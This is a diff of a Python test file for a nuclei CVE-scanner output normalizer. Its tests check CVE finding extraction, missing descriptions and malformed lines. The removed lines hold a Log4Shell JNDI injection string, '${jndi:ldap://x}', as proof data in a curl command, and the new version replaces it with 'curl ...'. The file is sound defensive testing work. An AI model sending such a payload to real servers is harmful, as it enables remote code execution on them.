@@ -3,53 +3,70 @@ import json
 from boefjes.plugins.kat_nuclei_cve.normalize import run
 from octopoes.models.ooi.findings import CVEFindingType, Finding
 
-input_ooi = {"primary_key": "URL|internet|https://example.com/"}
+INPUT_OOI = {"primary_key": "Hostname|internet|example.com"}
 
 
-def _line(cve_id: str, description: str = "Test description", curl: str = "curl https://example.com/") -> bytes:
-    return (
-        json.dumps(
-            {"info": {"classification": {"cve-id": [cve_id.lower()]}, "description": description}, "curl-command": curl}
-        )
-        + "\n"
-    ).encode()
+def _raw(*objs: dict) -> bytes:
+    return "\n".join(json.dumps(o) for o in objs).encode()
 
 
-def test_nuclei_cve_normalizer_empty_input():
-    assert list(run(input_ooi, b"")) == []
+def test_no_raw_yields_nothing():
+    assert list(run(INPUT_OOI, b"")) == []
 
 
-def test_nuclei_cve_normalizer_single_finding():
-    raw = _line("cve-2021-44228", "Log4Shell RCE", "curl 'https://example.com/${jndi:ldap://x}'")
+def test_valid_cve_line():
+    raw = _raw(
+        {
+            "template-id": "CVE-2021-44228",
+            "info": {"description": "Log4Shell", "classification": {"cve-id": ["cve-2021-44228"]}},
+            "curl-command": "curl ...",
+        }
+    )
+    out = list(run(INPUT_OOI, raw))
+    finding_types = [o for o in out if isinstance(o, CVEFindingType)]
+    findings = [o for o in out if isinstance(o, Finding)]
 
-    results = list(run(input_ooi, raw))
-
-    finding_types = [r for r in results if isinstance(r, CVEFindingType)]
-    findings = [r for r in results if isinstance(r, Finding)]
-    assert len(finding_types) == 1
-    assert finding_types[0].id == "CVE-2021-44228"
+    assert [ft.id for ft in finding_types] == ["CVE-2021-44228"]
     assert len(findings) == 1
-    assert findings[0].description == "Log4Shell RCE"
-    assert findings[0].proof == "curl 'https://example.com/${jndi:ldap://x}'"
+    assert findings[0].description == "Log4Shell"
+    assert findings[0].proof == "curl ..."
 
 
-def test_nuclei_cve_normalizer_multiple_findings_one_per_line():
-    raw = _line("cve-2021-44228", "Log4Shell") + _line("cve-2017-5638", "Struts RCE")
+def test_missing_description_does_not_crash():
+    # Regression: a CVE template without info.description used to raise KeyError and
+    # abort the whole task. It must now still yield the finding with description=None.
+    raw = _raw({"template-id": "CVE-2023-1234", "info": {"classification": {"cve-id": ["CVE-2023-1234"]}}})
 
-    results = list(run(input_ooi, raw))
+    findings = [o for o in run(INPUT_OOI, raw) if isinstance(o, Finding)]
 
-    finding_types = [r for r in results if isinstance(r, CVEFindingType)]
-    findings = [r for r in results if isinstance(r, Finding)]
-    assert {ft.id for ft in finding_types} == {"CVE-2021-44228", "CVE-2017-5638"}
-    assert len(findings) == 2
-    assert {f.description for f in findings} == {"Log4Shell", "Struts RCE"}
+    assert len(findings) == 1
+    assert findings[0].description is None
+    assert findings[0].proof is None
 
 
-def test_nuclei_cve_normalizer_uppercases_cve_id():
-    # Source data sometimes has lowercase CVE IDs; the normalizer should normalize them.
-    raw = _line("cve-2024-12345")
+def test_lines_without_cve_id_are_skipped():
+    raw = _raw(
+        {"template-id": "x", "info": {"classification": {"cve-id": None}}},
+        {"template-id": "y", "info": {"name": "no classification at all"}},
+    )
+    assert list(run(INPUT_OOI, raw)) == []
 
-    results = list(run(input_ooi, raw))
-    finding_types = [r for r in results if isinstance(r, CVEFindingType)]
 
-    assert finding_types[0].id == "CVE-2024-12345"
+def test_one_bad_line_does_not_drop_valid_findings():
+    raw = b"\n".join(
+        [
+            b"not json at all",
+            json.dumps({"template-id": "z", "info": {"classification": {"cve-id": None}}}).encode(),
+            json.dumps(
+                {
+                    "template-id": "CVE-2021-44228",
+                    "info": {"description": "Log4Shell", "classification": {"cve-id": ["CVE-2021-44228"]}},
+                    "curl-command": "curl ...",
+                }
+            ).encode(),
+        ]
+    )
+
+    finding_types = [o for o in run(INPUT_OOI, raw) if isinstance(o, CVEFindingType)]
+
+    assert [ft.id for ft in finding_types] == ["CVE-2021-44228"]
